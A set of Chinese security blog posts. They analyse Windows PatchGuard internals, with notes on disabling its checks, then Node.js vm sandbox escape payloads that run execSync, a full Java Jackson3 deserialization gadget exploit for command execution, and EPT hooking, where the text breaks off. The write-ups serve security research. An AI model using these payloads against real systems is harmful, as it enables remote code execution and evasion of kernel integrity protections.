PatchGuard 上下文结构，并可通过全局指针访问。虽然某些机制（例如校验和）是使用与 SHA256 相关的算法而不是通常的算法执行的，但我们没有专门分析这些机制，因为想法保持不变。值得注意的是，使用索引 7 调用 KiInitPatchGuardContext 始终会发生，并且与 Windows 8.1 相比，其他新方法会使用全局 PatchGuard 上下文。这结束了对 PatchGuard 可用于初始化上下文的各种方法的描述。此外，还可以描述提供给 KiInitPatchGuardContext 的其他参数。\n继续讨论 KiInitPatchGuardContext 函数的其他参数，我们已经讨论了第二和第四个参数的重要性。现在，让我们看看第一个参数，它是指向 DPC 例程的指针。由于多种 PatchGuard 方法使用 DPC 结构来隐藏 PatchGuard 并在某个点将其排队，因此必须注意，验证例程并非直接设置为 DPC 的例程。相反，DPC 将包含一个指向已知函数的指针，该函数会在 DPC 为 PatchGuard 时取消 DPC 的排队并执行特定操作。\n第一个参数随机选择一个索引来选择一个例程，该例程将被设置为以下函数之一：\n\nCmpEnableLazyFlushDpcRoutine\nExpCenturyDpcRoutine\nExpTimeZoneDpcRoutine\nExpTimeRefreshDpcRoutine\nCmpLazyFlushDpcRoutine\nExpTimerDpcRoutine\nIopTimerDispatch\nIopIrpStackProfilerDpcRoutine\nKiBalanceSetManagerDeferredRoutine\nPopThermalZoneDpc\nKiTimerDispatch&#x2F;KiDpcDispatch\nKiTimerDispatch&#x2F;KiDpcDispatch\nKiTimerDispatch&#x2F;KiDpcDispatch\n\n对于后三个例程 KiTimerDispatch 和 KiDpcDispatch，两者之间的选择取决于第二个参数是否小于 3。如果小于 3，则使用 KiTimerDispatch；否则，使用 KiDpcDispatch。\n\n在 KiFilterFiberContext 函数的先前伪代码中，第一个参数是随机选择的，除了最后一次调用 KiInitPatchGuardContext 时，它被设置为 0（CmpEnableLazyFlushDpcRoutine）。但是，在这种情况下，它不用于初始化例程。\n\nKiInitPatchGuardContext 的第三个参数是一个随机值，用于确定要检查的数据的总大小。该值除以硬编码值 0x140000，结果值立即设置到偏移量 0x6cc 处的 PatchGuard 上下文结构中。每次 PatchGuard 检查时要进行校验和的数据的最大大小（以字节为单位）由该值决定。PatchGuard 维护一个要检查完整性的结构列表，每次校验和之后，计数器都会增加数据的大小。当检查的数据总量小于先前定义的最大值时，PatchGuard 将继续检查其列表中的下一个结构。\nKiInitPatchGuardContext 的第五个参数是一个布尔值，用于确定是否应执行 ntoskrnl 函数的校验和。此检查完成后，结果将存储在 PatchGuard 上下文中，以及 PatchGuard 检查的其他 Windows 内核结构中。在 KiFilterFiberParam 中，仅在第一次调用 KiInitPatchGuardContext 时，此参数才设置为 True。\n以上就是可能来自 KiInitPatchGuardContext 的初始化方法的描述。其他方法直接初始化，或者根本不使用任何上下文结构。\nPatchGuardTVCallback 又名 542875F90F9B47F497B64BA219CACF69 回调KiFilterFiberContext 函数包含一个小的回调函数，该函数在 ntoskrnl 中找不到，并以名为 PatchGuardTVCallback 的函数指针作为参数。 此指针在二进制文件 mssecflt.sys 中的函数 SecInitializeKernelIntegrityCheck 中初始化。此函数直接从 mssecflt.sys 的驱动程序入口例程调用，该例程在启动过程中调用。 回调函数 SecKernelIntegrityCallback 只是将函数指针分配给全局变量，并将另一个全局变量设置为 SecProtectedRanges。 PatchGuardTVCallback 函数是 PatchGuard 检查例程之一，类似于 FsRtlMdlReadCompleteDevEx 函数，但调度方法不同。 此方法没有其他特定的初始化，因为它使用全局 PatchGuard 上下文结构。如果想了解有关此回调的更多信息，请查看 542875F90F9B47F497B64BA219CACF69\n\n附加检查 PspProcessDelete可以在特定函数（如 PspProcessDelete）中找到附加完整性检查，在删除进程期间对 KeServiceDescriptorTable 和 KeServiceDescriptorTableShadow 执行完整性检查。 此检查不需要任何 PatchGuard 上下文结构或专用线程，只是系统代码中存在的一小段验证。两个表的原始校验和以及计算校验和所需的初始化向量和移位值都保存在全局变量中，这使得攻击者可以修补描述符表（无论是否为 Shadow）的条目并替换原始校验和。使用 KiQueryUnbiaisedInterruptTime 生成的随机值计算校验和。如果这些校验和中的任何一个失败，则通过插入 KiSchedulerDpc 的 DPC 触发 KeBugCheck。这些校验和的初始化在 CmpInitDelayRefKCBEngine 中执行。要禁用此方法，可以将计时器修补为无限长或再次计算受 PatchGuard 保护的修改表的校验和。\n\nKiInitializeUserApc与 PspProcessDelete 类似，还有另一个函数，其中包含对中断描述符表 (IDT) 的独立完整性验证。如果检测到修改，则使用 KiSchedulerDpc 注入 DPC，然后触发 KeBugCheck。要禁用此方法，可以将计时器设置为无穷大。\n\nCcInitializeBcbProfilerPatchGuard 使用隐藏方法通过 CcInitializeBcbProfiler 函数执行检查。此函数首先计算 ntoskrnl 中随机例程的校验和。 然后，它使用 CcBcbProfiler 例程和一些附加数据设置 DPC。作为参数传递的结构包含计算随机例程校验和所需的所有内容，包括函数入口指针、图像的基址、函数大小、校验和以及用作校验和种子的随机值。DPC 使用 KeSetCoalescableTimer 排队，并将 DueTime 设置在 2’ 到 2’10” 之间。CcBcbProfiler 例程要么将参数中的工作项作为 WorkerRoutine 排队，要么继续执行。CcBcbProfiler 例程的主要目标是执行随机 ntoskrnl 函数的完整性检查，并将结果与​​存储在结构中的结果进行比较。之后，这两个函数都使用 KeSetCoalescableTimer 再次设置计时器。\n\nCcInitializeBcbProfilerPatchGuard 使用隐藏方法通过 CcInitializeBcbProfiler 函数执行检查。此函数首先计算 ntoskrnl 中随机例程的校验和。然后，它使用 CcBcbProfiler 例程和一些附加数据设置 DPC。 作为参数传递的结构包含计算随机例程校验和所需的所有内容，包括函数入口指针、图像的基址、函数大小、校验和以及用作校验和种子的随机值。 DPC 使用 KeSetCoalescableTimer 排队，并将 DueTime 设置在 2’ 到 2’10” 之间。CcBcbProfiler 例程要么将参数中的工作项作为 WorkerRoutine 排队，要么继续执行。CcBcbProfiler 例程的主要目标是执行随机 ntoskrnl 函数的完整性检查，并将结果与​​存储在结构中的结果进行比较。 之后，这两个函数都使用 KeSetCoalescableTimer 再次设置计时器。\n\n触发上下文本节重点介绍如何激活这些上下文结构，具体方法可能因使用的方法而异。\n通过 DPC 执行PatchGuard 用于启动检查的一种常见方法是通过 DPC。触发检查的 DeferredRoutine 函数是从十个函数池中选择出来的。编号为 0 到 9 的函数使用异常处理程序来激活检查（前面提到的随机函数），而 KiTimerDispatch 和 KiDpcDispatch 则直接调用 DPC，而不使用此异常技巧。此外，方法 5 始终使用 KiBalanceSetManagerDeferredRoutine 函数。调用 PatchGuard DPC 函数之一时，第一步是确定 DPC 是 PatchGuard DPC 还是普通 DPC。为此，该函数将 DPC 结构指针作为参数，用于检查 DPC 是否来自 PatchGuard。检查是根据参数 KDPC.DeferredContext 执行的，通过验证它是否具有规范地址。一个简单的代码片段用于检查 DeferredContext 是否具有规范地址。如果 DeferredContext 参数具有非规范地址，则该函数调用 KiCustomAccessRoutineN（N 根据调用的函数而变化）并执行所谓的“俄罗斯轮盘赌博技巧”。\n触发异常处理程序在检查 DeferredContext 参数的规范地址后，如果发现它是非规范的，PatchGuard 会调用函数 KiCustomAccessRoutineX。然后，此函数使用两个参数调用 KiCustomRecurseRoutineX：一个计数器和非规范 DeferredContext。计数器来自 DeferredContext 参数的最后两位加一。KiCustomRecurseRoutineX 函数由 10 个循环函数组成，这些函数会减少计数器并调用下一个函数，直到计数器达到零。该机制如图所示。其目的是不断减少计数器，直到无效指针被取消引用。根据原始函数，使用 try&#x2F;except&#x2F;finally 处理程序的组合来解密 PatchGuard 上下文结构。该机制类似于玩俄罗斯轮盘赌，玩家不断扣动枪的扳机，直到枪开火。\n\n解密上下文解密 PatchGuard 上下文结构第一层的责任在于异常处理程序。解密过程涉及两层和一个小技巧。第一层解密整个结构，然后其中的“一半”用硬编码值覆盖标头。第二层涉及自修改代码，该代码解密其余结构。\n解密第一层解密的初始步骤针对整个 PatchGuard 上下文结构。有各种代码可用于完成此任务，总结如下：CmpEnableLazyFlushDpcRoutine | 索引：0 | 方法 1ExpCenturyDpcRoutine | 索引：1 | 方法 1ExpTimeZoneDpcRoutine | 索引：2 | 方法 1ExpTimeRefreshDpcRoutine | 索引：3 | 方法 2CmpEnableLazyFlushDpcRoutine | 索引：4 | 方法 1ExpTimerDpcRoutine | 索引：5 |方法 2IopTimerDispatch | 索引：6 | 方法 2IopIrpStackProfilerDpcRoutine | 索引：7 | 方法 1KiBalanceSetManagerDeferredRoutine | 索引：8 | 方法 1PopThermalZoneDpc | 索引：9 | 方法 2KiTimerDispatch | 索引：10-12 | 使用全局变量的方法 1KiDpcDispatch | 索引：10-12 | 未使用\nPatchGuard 中使用的加密和解密例程依赖于存储在名为 KiWaitNever 和 KiWaitAlways 的全局变量中的随机值。这些变量在启动时保存随机生成的值，并由 KiInitPatchGuardContext 用来加密 PatchGuard 上下文结构。这意味着试图访问该结构的攻击者必须知道这些全局变量的位置，这需要访问 ntoskrnl 版本和相应的符号信息。\n解密第一层和“一半”在应用第二层解密之前，PatchGuard 会用硬编码值修改 PatchGuard 结构的前四个字节，这些硬编码值表示用于通过第三层解密（CmdAppendDllSection）解密上下文的代码。这种重写使用不同的方法，例如逐个重写每个字节或使用两个硬编码值的 XOR。目前不清楚为什么这样做，但这可能是作为即时代码优化引入的。另一种可能性是这样做是为了防止某些值在代码中被轻易搜索到，但这似乎并不是一个难以克服的障碍。\n解密第二层和最后一层第二层和最后一层解密涉及第二层的代码存在于 PatchGuard 上下文结构的第一部分中。在调用上一层解密后直接调用此代码。第二层解密以多个用于解密自身的 XOR 指令开始。解密过程可以分为两部分，第一部分是改写自己的指令，解密下一条指令，第二部分是解密循环，解密整个上下文结构。\n验证例程解密 PatchGuard 上下文结构后，将依次调用两个函数。第一个函数有两个主要目的。首先，它验证 PatchGuard 上下文结构和与 PatchGuard 相关的 47 个关键例程或部分例程的完整性。这是通过检查这些例程的代码并将其与预期值进行比较来完成的。如果检测到任何修改，PatchGuard 将触发 KeBugCheck 进程。其次，该函数初始化 WORK_QUEUE_ITEM 结构并选择一个存根以将验证例程作为 WorkItem 调用。存根可以是 KiMachineCheckControl 数组中的随机存根，即 PatchGuard 上下文结构中 FsRtlUninitializeSmallMcb 的副本。然后将 WORK_QUEUE_ITEM 结构作为参数传递给 ExQueueWorkItem，一旦 Worker 线程处理新项目，它就会启动验证例程。对于 DPC 方法，此机制用于将控制权传递给验证例程。\n通过系统线程PatchGuard 使用的第三种方法涉及创建系统线程，此函数在 KiInitPatchGuardContext 中调用。\n触发异常处理程序该错误是由取消引用被认为是“随机”的寄存器引起的。\n新线程创建此方法涉及创建新的系统线程。使用 KI_FILTER_FIBER_PARAM 结构中包含的指向 PsCreateSystemThread 的指针创建该线程。传递给 PsCreateSystemThread 的 StartContext 参数是指向名为 PG_StartContext 的新结构的指针，该结构包含指向同一结构中的事件的指针、布尔值、未知字段和 KEVENT 对象。事件在函数中初始化，新创建的线程等待使用存根函数中的 KeWaitForSingleObject 发出此事件的信号。事件在 KiInitPatchGuardContext 结束时发出信号，然后开始解密和检查过程。步骤 3 涉及解密过程，该过程与 DPC 使用的解密过程相同，使用两阶段解密并附加硬编码序言。第一阶段使用 KiWaitNever 和 KiWaitAlways，第二阶段由 CmpAppendDllSection 的副本执行，然后进入验证例程。验证例程结束后，使用 KeDelayExecutionThread 或 KeWaitForSingleObject 将上下文恢复为等待状态，超时时间设置在 2 到 2 分 10 秒之间，这是在禁用驱动程序中搜索 PatchGuard 线程的重要位置。\n通过 APC 插入如前所述，第四种方法涉及将 APC 插入系统线程队列，其中 StartAddress 指向 PopIrpWorkerControl，KernelRoutine 参数为 KiDispatchCallout。与 DPC 和系统线程方法类似，它采用两阶段解密例程，并使用硬编码 XOR 值覆盖上下文的第一部分。由于 APC 的交付速度很快，因此这种方法相对较快。但是，与以前的方法类似，需要进行验证等待以确保经过最少的时间，等待时间为 2 到 2.10 秒。需要注意的是，在禁用驱动程序中搜索 PatchGuard 线程时，也应考虑此方法。\n通过全局变量调用在 KiFilterFiberContext 方法中，会通知一个回调函数，即我们之前讨论过的 TV 回调 (PatchGuardTVCallback)，它将指向检查例程的指针放在 mssecflt.sys 的全局变量中。此方法利用全局 PatchGuard 上下文结构，当第二个参数为 7 时，该结构由 KiInitPatchGuardContext 初始化。与其他方法不同，此方法不需要解密过程，因为全局 PatchGuard 结构在内存中以明文形式存在。检查例程最多可调用五次，直到返回的状态不同于 STATUS_MORE_PROCESSING_REQUIRED。交叉引用此函数表明它可以从不同的路径调用，其中最有趣的是 SetGetProcessContextWithAssertion，它可以从多个回调函数调用，例如 SecPreCleanup、SecSendFileDeleteEvent、SecSendFileModifyEvent 等。对检查例程的调用直接进入检查，并且此版本的检查例程中不存在负责修改 PatchGuard 与该方法的行为的代码。\n通过 KiSwInterruptDispatch与全局变量方法类似，此技术还利用了内存中以明文形式存在的 PatchGuard 上下文结构。因此，不需要解密过程，验证例程在 KiSwInterrupt 的某个阶段直接调用，这是一个 IDT 函数。\n验证阶段本节讨论 PatchGuard 中使用的不同验证例程，包括 FsRtlMdlReadCompleteDevEx，它是主例程。该函数可分为几个部分，包括序言，它涉及对 pg_ctx 部分进行校验和并重新加密第 1 部分，然后对第 2 部分和第 3 部分进行校验和，然后等待。然后，该函数解密第 1 部分，对第 2 部分和第 3 部分进行校验和，并将它们与保存的校验和进行比较。它还对第 1 部分进行校验和并设置亲和性线程。\n序言\nPatchGuard 首先检查整个 PatchGuard 上下文结构的完整性，该结构现在以纯文本形式存储在内存中。它将校验和结果与上下文解密之前存储的结果进行比较，该结果在 KiInitPatchGuardContext 中初始化。在执行校验和之前，变量数据会保存在堆栈上并从结构中清除，以确保校验和保持不变。这包括上下文校验和之类的值以及 WorkItem 之类的结构。\nPatchGuard 继续重新加密 PatchGuard 上下文结构的第一部分。尚不清楚为什么结构的其余部分未加密。\nPatchGuard 对上下文中的第 2 部分和第 3 部分执行另一次校验和，其中包含一些 NT 例程的完整代码，以及一个包含每个关键结构的信息的数组，这些结构稍后将进行验证。在等待之前，PatchGuard 不会重新加密这些部分。\n等待（休眠）可确保两次检查之间至少间隔两分钟。它可以通过以下三种不同的方法之一来执行：未命名函数、KeWaitForSingleObject 或 KeDelayExecutionThread。\n在主函数中，上下文的第一部分无需任何额外步骤即可解密。\n对上下文的第 2 部分和第 3 部分执行校验和，以确保在等待期间没有发生任何修改。原始校验和先前存储在寄存器中，并由等待例程推送&#x2F;弹出到堆栈上，因此很难找到和修改。 \n对上下文的前 0x618 个字节进行校验和，其中包含函数指针，但不包含哈希值或变量。将结果与 KiInitPatchGuardContext 中上下文初始化期间计算的原始校验和进行比较，后者存储在结构中的偏移量 0x8b8 处。 \n为了确定将在其上运行检查的处理器，PatchGuard 检索先前在 KiInitPatchGuardContext 中设置的 SessionId，并生成 0 到系统上进程总数之间的随机值。 PatchGuard 不会选择随机 PID，而是循环获取第 n 个进程，其中 n 是随机值。接下来，PatchGuard 附加到此进程并检索其组亲和性。通过对表示亲和性的位图执行汉明权重，可获得 0 到可运行此线程的处理器数量之间的随机值。使用随机值 n，PatchGuard 选择使用 KeEnumerateNextProcessor 循环获得的第 n 个处理器，并将新亲和性设置为此处理器。例如，如果线程可以在处理器 1、2 和 6 上运行，PatchGuard 将选择一个随机值 0&lt;&#x3D;n&lt;3，并使用 KeSetSystemGroupAffinityThread 将其系统亲和性设置为 n。\n\n内核结构的完整性检查PatchGuard 算法对 PatchGuard 上下文结构中包含的各种数据结构进行操作。此结构包括指向要检查的数据的指针、数据大小、类型以及初始化期间计算的校验和等信息。算法首先分派要检查的数据类型，以确定当前结构之后要检查的下一个结构。这很重要，因为某些结构可能需要初步检查或操作，然后才能使用校验和进行完整性验证。验证所选结构的完整性后，PatchGuard 会增加检查的数据总量，并将其与 KiInitPatchGuardContext 的第三个参数中定义的最大值进行比较。如果总量尚未达到，PatchGuard 将继续处理关键数据结构数组中的下一个条目。对于第二部分，PatchGuard 计算中断描述符表 (IDT) 寄存器指向的表的校验和。在哈希计算之后，PatchGuard 恢复之前的处理器亲和性，并将获得的哈希与存储在内存中的哈希进行比较。\n检测到修改时在 PatchGuard 中完成 IDT 案例的校验和后，将恢复当前线程的原始关联性，并将计算出的哈希值与初始化阶段的哈希值进行比较。如果检测到修改，PatchGuard 会在执行某些特定操作后触发 BSOD。\n首先，PatchGuard 将结构置于通用状态，通过在堆栈上保存值并从上下文中清除它们来计算校验和。这包括完整上下文结构的校验和、已检查数据的总大小以及工作项，工作项保存在堆栈中并从上下文中清零。然后，执行完整结构的校验和。此后，从堆栈中恢复上下文中的工作项，并将校验和结果存储在特定偏移量处。虽然这个校验和没有与前一个校验和进行比较，但它似乎并不那么重要。接下来，PatchGuard 继续重新加密 PatchGuard 上下文开头的 CmpAppendDllSection 代码。目前尚不清楚为什么需要进行这种加密，特别是因为结构的其余部分目前仍为明文。在重新加密过程中，新加密的数据是选定的部分，其余部分是随后立即加密的数据。\n检测到潜在攻击后，该过程的下一步是恢复敏感数据。在调用 KeBugCheck 时，PatchGuard 倾向于重写 PTE 和 Windows 关键例程，而不是检查完整性。首先使用 KeAquireSpinLockForDpc 从上下文中获取 PTE 以安全地操作它们。使用了一个“技巧”，其中“mov cr4”指令通过修改第 7 位（即 PGE）来刷新 TLB（包括全局条目）。重写的下一部分涉及关键例程，例如 KeBugCheckEx、KeBugCheck 或 KeIsEmptyAffinityEx，它们被重写并存储为 PatchGuard 上下文中的对数组（pFunction、size_of_routine）。 DbgPrint 例程也被重写为 0xC3，这是一个“ret”指令，作为一种反调试措施。PatchGuard 清除了上下文结构中位于 0x610 和 0x690 处的两个偏移量，尽管原因未知。最后，PatchGuard 调用 KeGuardCheckICall 并以 KeBugCheckEx 作为参数，但如果使用的调度方法不是 7，则调用 SdpbCheckDll 而不是 KeBugCheckEx。****\n总结PatchGuard 检查例程分为两部分：一部分用于检测到修改，另一部分用于一切正常。当完成结构的最终哈希比较时，如果检查的数据总量低于 KiInitPatchGuardContext 中定义的最大值，则 PatchGuard 将继续处理数组中的下一个结构。如果超过最大值，它将重新装备 PatchGuard 上下文以供以后使用，这与初始化过程类似。对于方法 0、1、2、4 和 5，代码与初始化过程几乎相同。这些方法涉及调用 KeSetCoalescableTimer、将 DPC 存储在 KPRCB.AcpiReserved 和 KPRCB.HalReserved 中、使用 KeInsertQueueApc 插入 APC 或在全局变量中设置 DPC。对于创建系统线程的第三种方法，它会重新装备，但不在同一个主函数中。验证例程完成后，一个小调度程序会在 KeDelayExecutionThread 或 KeWaitForSingleObject 之间进行选择。如果选择 KeDelayExecutionThread，则设置 2’ 到 2’10” 之间的超时。如果使用 KeWaitForSingleObject，则这次设置相同的 2’ 超时。在这种情况下，在第七个方法的 KiInitPatchGuardContext 末尾通过 KeSetEvent 通知的事件被重置，并且有 50% 的可能性永远不会再次设置它。\n","categories":["Windows安全"],"tags":["Windows","PatchGuard"]},{"title":"nodejs沙盒逃逸分析","url":"/2022/11/17/nodejs%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/","content":"前提先搞懂原型链污染。\nVM简介node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。vm 模块可在 V8 虚拟机上下文中编译和运行代码。 注意的是：vm 模块不是安全的机制。 不要使用它来运行不受信任的代码。\nVM模块官方文档原话：\n\n一个常见的用例是在不同的 V8 上下文中运行代码。 这意味着被调用的代码与调用的代码具有不同的全局对象。\n\n可以通过使对象上下文隔离化来提供上下文。 被调用的代码将上下文中的任何属性都视为全局变量。 由调用的代码引起的对全局变量的任何更改都将会反映在上下文对象中。\njsconst vm = require(&#x27;vm&#x27;);const x = 1;const context = &#123; x: 2 &#125;;vm.createContext(context); // 创建上下文隔离化对象。const code = &#x27;x += 40; var y = 17;&#x27;;// `x` and `y` 是上下文中的全局变量。// 最初，x 的值为 2，因为这是 context.x 的值。vm.runInContext(code, context);console.log(context.x); // 42console.log(context.y); // 17console.log(x); // 1; y 没有定义。\n\n上面这个例子完美的诠释了下面这张图的内容(很明显的是沙盒环境代码只能读取 VM 上下文的数据)\n\n所有用 Node.js 所运行的 JavaScript 代码都是在一个”上下文”的作用域中被执行的。\n官方文档当中有这样一句话\n在 V8 中，一个上下文是一个执行环境，它允许分离的，无关的 JavaScript 应用在一个 V8 的单例中被运行。 必须明确地指定用于运行所有 JavaScript 代码的上下文。\n当我们去调用 vm.createContext() 方法时， contextObject参数（如果 contextObject 为 undefined，则为新创建的对象）在内部与 V8 上下文的新实例相关联。 该 V8 上下文提供了使用 vm 模块的方法运行的 code 以及可在其中运行的隔离的全局环境。\n沙盒执行上下文是隔离的，但可通过原型链的方式获取到沙盒外的 Function，从而完成逃逸，拿到全局数据，示例图如下：\n\n沙盒逃逸首先看下官方示例\njsconst vm = require(&quot;vm&quot;);const ctx = &#123;&#125;;vm.runInNewContext(&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;,ctx);console.log(&quot;Never gets executed.&quot;);\n\n上述代码在执行时，程序在第二行就直接退出，vm虚拟机环境中的代码逃逸，获得了主线程的 process 变量，并调用 process.exit()，造成主程序非正常退出。\n它等同于\njsconst sandbox = this; // 获取Contextconst ObjectConstructor = this.constructor; // 获取 Object 对象构造函数const FunctionConstructor = ObjectConstructor.constructor; // 获取 Function 对象构造函数const myfun = FunctionConstructor(&#x27;return process&#x27;); // 构造一个函数，返回process全局变量const process = myfun();process.exit();\n\n以上是通过原型链方式完成逃逸，如果将上下文对象的原型链设置为 null 会怎么做\njsconst vm = require(&quot;vm&quot;);const ctx = Object.create(null);ctx.data = &#123;&#125;;vm.runInNewContext(    &#x27;this.data.constructor.constructor(&quot;return process&quot;)().exit()&#x27;,    ctx);console.log(&quot;Never gets executed.&quot;);\n\n由于 JS 里所有对象的原型链都会指向 Object.prototype，且 Object.prototype 和 Function 之间是相互指向的，所有对象通过原型链都能拿到 Function，最终完成沙盒逃逸并执行代码。\n逃逸后代码可以执行如下代码拿到 require，从而并加载其他模块功能\n把原型链污染中的常用Payload转换过来如下\njsconst vm = require(&quot;vm&quot;);const ctx = &#123;    console,&#125;;vm.runInNewContext(    `    var exec = this.constructor.constructor;    var require = exec(&#x27;return process.mainModule.constructor._load&#x27;)();    console.log(require(&#x27;child_process&#x27;).execSync(&quot;ls&quot;).toString());`,    ctx);\n\n引用NodeJS沙箱逃逸分析\n官方API\n凹凸实验室\n关于javascript:nodejs-沙盒逃逸分析\nNPM酷库：vm2，安全的沙箱环境\n","categories":["WEB"],"tags":["js","node.js","前端安全"]},{"title":"jackson3 链浅析","url":"/2025/09/16/jackson3%E9%93%BE%E6%B5%85%E6%9E%90/","content":"分析换新入口jackson2链中的入口，在JDK17里 BadAttributeValueExpException 利用不了了，没有触发 toString 的点了\n\n\n所以通过入口 EventListenerList#readObject , 来利用字符串与对象的拼接触发 toString\n\n绕过模块化javapublic static void patchModule(Class clazz, Class goalclass) &#123;        try &#123;            Class UnsafeClass = Class.forName(&quot;sun.misc.Unsafe&quot;);            Field unsafeField = UnsafeClass.getDeclaredField(&quot;theUnsafe&quot;);            unsafeField.setAccessible(true);            Unsafe unsafe       = (Unsafe) unsafeField.get(null);            Object ObjectModule = Class.class.getMethod(&quot;getModule&quot;).invoke(goalclass);            Class  currentClass = clazz;            long   addr         = unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;));            unsafe.getAndSetObject(currentClass, addr, ObjectModule);        &#125; catch (Exception e) &#123;        &#125;    &#125;\n\n具体是这段，也就是通过 unsafe.getAndSetObject 修改模块对象一致\n但是实际发现在 JDK8 时不需要这段也可以利用成功。\n跟下来发现这段，意思是被调用类没有模块名字的话就直接返回 true，那 JDK8 中并没有引入JPMS所以模块为空。\n\nAOP代理加了aop，类代理后是 javax.xml.transform.Templates ，在 java.xml 包名下，因此绕过了包管理机制\nEXP所以在JDK8下最终的gadget为\njavapackage com.qi4l.JYso.gadgets;import com.fasterxml.jackson.databind.node.POJONode;import com.qi4l.JYso.gadgets.annotation.Dependencies;import com.qi4l.JYso.gadgets.utils.SuClassLoader;import com.qi4l.JYso.gadgets.utils.Gadgets;import javassist.ClassClassPath;import org.springframework.aop.framework.AdvisedSupport;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import org.springframework.aop.framework.AdvisorChainFactory;import javax.xml.transform.Templates;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.lang.reflect.*;import java.util.Vector;import static com.qi4l.JYso.gadgets.Config.Config.POOL;import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;@Dependencies(&#123;&quot;spring-apo:6.2.10&quot;&#125;)public class Jackson3 implements ObjectPayload&lt;Object&gt; &#123;    public static Object makeTemplatesImplAopProxy(String cmd) throws Exception &#123;        AdvisedSupport advisedSupport = new AdvisedSupport();        advisedSupport.setTarget(Gadgets.createTemplatesImpl(cmd));        POOL.insertClassPath(new ClassClassPath(Class.forName(&quot;org.springframework.aop.framework.DefaultAdvisorChainFactory&quot;)));        final CtClass ctDefaultAdvisorChainFactory = POOL.get(&quot;org.springframework.aop.framework.DefaultAdvisorChainFactory&quot;);        insertField(ctDefaultAdvisorChainFactory, &quot;serialVersionUID&quot;, &quot;private static final long serialVersionUID = 273003553246259276L;&quot;);        Object cFactory = ctDefaultAdvisorChainFactory.toClass(new SuClassLoader()).newInstance();        advisedSupport.setAdvisorChainFactory((AdvisorChainFactory) cFactory);        Constructor constructor = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;).getConstructor(AdvisedSupport.class);        constructor.setAccessible(true);        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);        Object            proxy   = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Templates.class&#125;, handler);        return proxy;    &#125;    public static Object getEventListenerList(Object obj) throws Exception &#123;        //EventListenerList list = new EventListenerList();        POOL.insertClassPath(new ClassClassPath(Class.forName(&quot;javax.swing.event.EventListenerList&quot;)));        final CtClass ctEventListenerList = POOL.get(&quot;javax.swing.event.EventListenerList&quot;);        insertField(ctEventListenerList, &quot;serialVersionUID&quot;, &quot;private static final long serialVersionUID = -7977902244297240866L;&quot;);        Object list = ctEventListenerList.toClass(new SuClassLoader()).newInstance();        //UndoManager undomanager = new UndoManager();        POOL.insertClassPath(new ClassClassPath(Class.forName(&quot;javax.swing.undo.UndoManager&quot;)));        final CtClass ctUndoManager = POOL.get(&quot;javax.swing.undo.UndoManager&quot;);        insertField(ctUndoManager, &quot;serialVersionUID&quot;, &quot;private static final long serialVersionUID = -1045223116463488483L;&quot;);        Object undomanager = ctUndoManager.toClass(new SuClassLoader()).newInstance();        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。        Vector vector = (Vector) getFieldValue(undomanager, &quot;edits&quot;);        vector.add(obj);        setFieldValue(list, &quot;listenerList&quot;, new Object[]&#123;Class.class, undomanager&#125;);        return list;    &#125;    public static Object getFieldValue(Object obj, String fieldName) throws Exception &#123;        Field field = null;        Class c     = obj.getClass();        for (int i = 0; i &lt; 5; i++) &#123;            try &#123;                field = c.getDeclaredField(fieldName);            &#125; catch (NoSuchFieldException e) &#123;                c = c.getSuperclass();            &#125;        &#125;        field.setAccessible(true);        return field.get(obj);    &#125;    public static void setFieldValue(Object obj, String field, Object val) throws Exception &#123;        Field dField = obj.getClass().getDeclaredField(field);        dField.setAccessible(true);        dField.set(obj, val);    &#125;    @Override    public Object getObject(final String command) throws Exception &#123;        try &#123;            CtClass  ctClass      = ClassPool.getDefault().get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);            CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);            ctClass.removeMethod(writeReplace);            ctClass.toClass();        &#125; catch (Exception EE) &#123;        &#125;                POJONode node = new POJONode(makeTemplatesImplAopProxy(command));        Object eventListenerList = getEventListenerList(node);        return eventListenerList;    &#125;&#125;","categories":["WEB"],"tags":["java","gadget"]},{"title":"浅谈EPT无痕HOOK的方法","url":"/2024/08/04/%E6%B5%85%E8%B0%88EPT%E6%97%A0%E7%97%95HOOK%E7%9A%84%E6%96%B9%E6%B3%95/","content":"在进入VMX操作，一个很有用的功能就是在开启EPT机制后，进行1:1身份映射后HOST GUEST\n进行EPT HOOK，通常作用有两种\n\n无痕监控读写，类似调试器的内存读写断点\n无痕Hook，类似调试器的调试断点\n\n对于第一种实现起来很简单，方法也基本一致\n通常是EPT Entry属性修改为不可读写，触发EPT Violation在其中进行MTF位\n同时设置可读写，让这行代码可以执行。MTF Handler中设置为不可执行\n从而实现无痕监控读写\n而对于第二种EPT的应用方法，目前来说大概有三种\n无需MTF置位的无痕Hook方式和周壑的VT一样，思路如下\n\n设置EPT页级Hook，使整读和写页无效，而只留下可执行属性\n分配一个新的物理内存（P2），EPT中的EPT Pml1Entry的PhyFrameNumber（原来的P1）替换成新分配的\n修改P2，使其变成一个绝对跳转，跳转到Hook的地方去执行\n页面受到读写访问，EPT Violation，此时将此页面为可读写，不可执行\n下次执行的时候，遇到不可执行内存，EPT Violation再次恢复可执行，不可读写\n\n缺点此Hook有个很大的缺陷，考虑如下。\nhook_4kb_addr:    mov rax, ds:[hook_4kb_addr]\n\n这样就会无限MTF，不断的切换不可读写，可读写，导致CPU卡死\n仿内存执行断点的无痕Hook方法如下：\n\n设置页面HOOK，全程可读写，不可执行\n这样有可能就会某一次到要HOOK的地方，但是页可能不到\n如果没到，而是其他地址，恢复可执行，并设置MTF，在MTF 